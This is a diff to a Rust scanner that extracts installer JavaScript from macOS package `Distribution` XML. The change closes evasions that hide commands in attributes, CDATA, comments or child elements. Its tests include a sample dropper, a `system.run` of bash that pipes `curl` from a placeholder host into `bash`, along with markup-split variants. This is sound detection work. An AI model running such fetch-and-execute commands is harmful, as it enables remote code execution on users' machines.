@@ -172,21 +172,10 @@ fn scan_scripts_entry(
     Ok(())
 }
 
-/// `Distribution` attributes whose value is a JavaScript expression.
-const DISTRIBUTION_JS_ATTRS: &[&str] = &[
-    "selected",
-    "enabled",
-    "visible",
-    "start_selected",
-    "start_enabled",
-    "start_visible",
-    "onConclusionScript",
-    "script",
-];
-
 /// Extracts the installer JavaScript from `Distribution` XML: `<script>`
-/// bodies (raw, `<![CDATA[` stripped or entities decoded) and the
-/// [`DISTRIBUTION_JS_ATTRS`] values, joined with `\n`. Empty if there is none.
+/// bodies as an XML parser would deliver them (see [`script_body_texts`]) and
+/// every attribute value (entity-decoded), joined with `\n`. Over-inclusive on
+/// purpose: any attribute can carry an expression. Empty if there is none.
 /// `NotApplicable` on malformed XML, an unterminated `<script>`, or bytes with
 /// no element at all (compressed or otherwise undecodable, §11.8).
 fn distribution_js(raw: &[u8]) -> Result<Vec<u8>, RuleOutcome> {
@@ -205,16 +194,14 @@ fn distribution_js(raw: &[u8]) -> Result<Vec<u8>, RuleOutcome> {
                 self_closing,
             }) => {
                 saw_element = true;
-                for want in DISTRIBUTION_JS_ATTRS {
-                    if let Some(v) = xml::attr(attrs, want) {
-                        pieces.push(v);
-                    }
+                for (_, value) in xml::attrs(attrs) {
+                    pieces.push(xml::decode_entities(value));
                 }
                 if name == "script" && !self_closing {
                     let raw = scanner
                         .raw_until_close("script")
                         .ok_or(RuleOutcome::NotApplicable)?;
-                    pieces.push(script_body_text(raw));
+                    pieces.extend(script_body_texts(raw));
                 }
             }
             xml::Next::Event(_) => {}
@@ -251,25 +238,96 @@ fn utf16_to_utf8(b: &[u8]) -> Option<Vec<u8>> {
     Some(String::from_utf16_lossy(&units).into_bytes())
 }
 
-/// Text of a raw `<script>` body: the CDATA content if wrapped in one,
-/// otherwise the entity-decoded body.
-fn script_body_text(raw: &[u8]) -> String {
-    let start = raw
-        .iter()
-        .position(|c| !c.is_ascii_whitespace())
-        .unwrap_or(raw.len());
-    let end = raw
-        .iter()
-        .rposition(|c| !c.is_ascii_whitespace())
-        .map_or(start, |i| i + 1);
-    let trimmed = raw.get(start..end).unwrap_or(&[]);
-    match trimmed
-        .strip_prefix(b"<![CDATA[".as_slice())
-        .and_then(|r| r.strip_suffix(b"]]>".as_slice()))
-    {
-        Some(inner) => String::from_utf8_lossy(inner).into_owned(),
-        None => xml::decode_entities(raw),
+/// The text(s) a `<script>` body yields: CDATA verbatim, comments and
+/// processing instructions dropped, the rest entity-decoded (a raw `<` that
+/// starts none of those stays literal, as in `a < b`). A second variant with
+/// tag-shaped runs removed is added when it differs, covering child elements
+/// that split a token (`cu<b/>rl`).
+fn script_body_texts(raw: &[u8]) -> Vec<String> {
+    let mut with_tags = String::new();
+    let mut without_tags = String::new();
+    let (mut seg_start, mut from) = (0usize, 0usize);
+    while let Some(off) = raw.get(from..).and_then(|r| xml::find(r, b"<")) {
+        let at = from.saturating_add(off);
+        let here = raw.get(at..).unwrap_or(&[]);
+        let markup: Option<(usize, &[u8])> = if here.starts_with(b"<![CDATA[") {
+            Some((9, b"]]>"))
+        } else if here.starts_with(b"<!--") {
+            Some((4, b"-->"))
+        } else if here.starts_with(b"<?") {
+            Some((2, b"?>"))
+        } else {
+            None
+        };
+        let Some((open_len, closer)) = markup else {
+            from = at.saturating_add(1);
+            continue;
+        };
+        flush_segment(
+            raw.get(seg_start..at).unwrap_or(&[]),
+            &mut with_tags,
+            &mut without_tags,
+        );
+        let body_start = at.saturating_add(open_len);
+        let body = raw.get(body_start..).unwrap_or(&[]);
+        let (inner, after) = match xml::find(body, closer) {
+            Some(i) => (
+                body.get(..i).unwrap_or(&[]),
+                body_start.saturating_add(i).saturating_add(closer.len()),
+            ),
+            None => (body, raw.len()),
+        };
+        if open_len == 9 {
+            let text = String::from_utf8_lossy(inner);
+            with_tags.push_str(&text);
+            without_tags.push_str(&text);
+        }
+        seg_start = after;
+        from = after;
     }
+    flush_segment(
+        raw.get(seg_start..).unwrap_or(&[]),
+        &mut with_tags,
+        &mut without_tags,
+    );
+    let mut out = vec![with_tags.clone()];
+    if without_tags != with_tags {
+        out.push(without_tags);
+    }
+    out
+}
+
+/// Appends the entity-decoded `seg` to the with-tags text, and the same with
+/// tag-shaped runs removed to the other.
+fn flush_segment(seg: &[u8], with_tags: &mut String, without_tags: &mut String) {
+    with_tags.push_str(&xml::decode_entities(seg));
+    without_tags.push_str(&xml::decode_entities(&strip_tags(seg)));
+}
+
+/// Removes tag-shaped runs (`<` + letter or `/`, through the next `>`).
+fn strip_tags(seg: &[u8]) -> Vec<u8> {
+    let mut out = Vec::with_capacity(seg.len());
+    let mut i = 0usize;
+    let mut no_more_gt = false;
+    while let Some(&c) = seg.get(i) {
+        let tag_like = c == b'<'
+            && !no_more_gt
+            && seg
+                .get(i + 1)
+                .is_some_and(|n| n.is_ascii_alphabetic() || *n == b'/');
+        if tag_like {
+            match seg.get(i..).and_then(|r| xml::find(r, b">")) {
+                Some(g) => {
+                    i = i.saturating_add(g).saturating_add(1);
+                    continue;
+                }
+                None => no_more_gt = true,
+            }
+        }
+        out.push(c);
+        i += 1;
+    }
+    out
 }
 
 /// Reads the `Distribution` entry and scans its JavaScript. Errors with
@@ -508,7 +566,49 @@ mod tests {
             r#"<c selected="system.compareVersions(v, '10.9') &lt; 1" title="Not JS" onConclusionScript="done()"/>"#,
         )
         .unwrap();
-        assert_eq!(out, "system.compareVersions(v, '10.9') < 1\ndone()");
+        assert_eq!(out, "system.compareVersions(v, '10.9') < 1\nNot JS\ndone()");
+    }
+
+    const DROPPER: &str =
+        r#"system.run("/bin/bash","-c","curl -fsSL https://example-cdn.invalid/a.sh | bash")"#;
+
+    #[test]
+    fn a_close_tag_inside_cdata_does_not_hide_the_rest_of_the_script() {
+        let out = js(&format!(
+            r#"<a><script><![CDATA[ var s = "</script>"; {DROPPER}; ]]></script></a>"#
+        ))
+        .unwrap();
+        assert!(out.contains(DROPPER), "{out}");
+    }
+
+    #[test]
+    fn markup_inside_a_script_body_is_joined_as_a_parser_would() {
+        let cdata = js(r#"<a><script>system.run("/bin/ba<![CDATA[sh]]>", "-c", "x")</script></a>"#)
+            .unwrap();
+        assert!(cdata.contains(r#"system.run("/bin/bash""#), "{cdata}");
+        let comment = js("<a><script>cu<!-- x -->rl http://x | bash</script></a>").unwrap();
+        assert!(comment.contains("curl http://x | bash"), "{comment}");
+        let pi = js("<a><script>cu<?pi x?>rl</script></a>").unwrap();
+        assert!(pi.contains("curl"), "{pi}");
+    }
+
+    #[test]
+    fn a_child_element_variant_is_scanned_as_well() {
+        let out = js("<a><script>cu<b/>rl http://x | bash</script></a>").unwrap();
+        assert!(out.contains("curl http://x | bash"), "{out}");
+        assert!(out.contains("cu<b/>rl"), "{out}");
+    }
+
+    #[test]
+    fn a_commented_out_script_extracts_nothing() {
+        let out = js("<a><script><!-- system.run('/bin/bash') --></script></a>").unwrap();
+        assert_eq!(out, "");
+    }
+
+    #[test]
+    fn every_attribute_value_is_extracted() {
+        let out = js(r#"<pkg-ref active="system.run('/bin/bash')"/>"#).unwrap();
+        assert!(out.contains("system.run('/bin/bash')"), "{out}");
     }
 
     #[test]
@@ -522,10 +622,7 @@ mod tests {
 
     #[test]
     fn distribution_without_js_extracts_nothing() {
-        assert_eq!(
-            js(r#"<a><title>T</title><script/><choice id="x"/></a>"#).unwrap(),
-            ""
-        );
+        assert_eq!(js("<a><title>T</title><script/><choice/></a>").unwrap(), "");
         assert_eq!(js("<a><script>  \n </script></a>").unwrap(), "");
     }
 
